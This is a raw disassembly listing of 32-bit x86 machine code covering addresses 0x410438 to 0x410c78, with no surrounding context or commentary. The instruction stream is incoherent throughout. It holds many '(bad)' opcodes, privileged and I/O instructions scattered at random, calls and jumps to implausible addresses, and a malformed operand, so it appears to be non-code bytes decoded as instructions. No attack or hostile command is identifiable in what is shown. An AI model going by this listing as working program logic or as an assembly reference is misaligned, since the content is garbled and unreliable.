  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
